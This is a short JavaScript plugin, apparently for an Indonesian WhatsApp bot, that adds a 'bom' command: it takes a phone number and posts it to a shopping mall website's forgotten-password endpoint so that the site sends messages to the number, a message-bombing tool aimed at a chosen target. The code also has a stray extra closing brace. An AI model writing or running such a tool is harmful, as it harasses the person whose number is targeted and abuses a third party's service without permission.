import formData from 'form-data'
import fetch from 'node-fetch'


let handler = async (m, { conn, text, usedPrefix }) => {
  if (!text) throw `Contoh Penggunaan\n${usedPrefix}BomWA 628xxxxxxxx`
  let nomor = text.replace(/[^0-9]/gi, '').slice(2)
  if (!nomor.startsWith('6')) throw `Contoh Penggunaan\n${usedPrefix}BomWA 628xxxxxxxx`
  
  m.reply('_*Tunggu permintaan anda sedang diproses.....*_')
  
  	let form = new formData;
	      form.append('whatsapp', nomor);
	let asu = await fetch('https://tasya.tunjunganplaza.com/login/forgotten', {
		method: 'POST',
		headers: form.getHeaders(),
		body: form.getBuffer()
	}).then(a => a.json())

    let kirik = `*Lapor Status Pesan* : _${asu.pesan}_\n\n_!_`
  conn.reply(m.chat, `${kirik}`.trim(), m)
  
}
}
handler.help = ['bom <nomor>']
handler.tags = ['tools']
handler.command = /^(bom)$/i

export default handler
